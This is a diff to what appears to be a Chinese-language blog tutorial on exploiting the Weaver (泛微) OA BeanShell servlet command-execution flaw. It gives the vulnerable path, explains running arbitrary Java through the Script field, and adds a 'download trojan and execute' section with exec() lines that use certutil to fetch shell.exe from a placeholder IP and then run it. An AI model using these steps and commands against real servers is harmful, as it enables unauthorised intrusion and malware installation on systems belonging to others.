@@ -26,9 +26,12 @@ https://blog.csdn.net/F12138_/article/details/80220698
 ### 2、安装泛微OA
 相关的安装包和文档在这里：https://pan.baidu.com/s/1co--qbqBR_2-bqcRWtfOtg
 ### 3、漏洞利用
+#### 命令执行
 直接在网站根目录后加入组件访问路径 /weaver/bsh.servlet.BshServlet/
 
 访问后直接在 Script 处输入Java代码点击 Evaluate 即可触发漏洞，并可以在Script Output处看到回显
 ![-w913](/img/16027836924596.jpg)
-
+#### 下载木马并执行
+exec("cmd /c certutil -urlcache -split -f http://xxx.xxx.xxx.xxx/shell.exe")
+exec("cmd /c ./shell.exe")
 
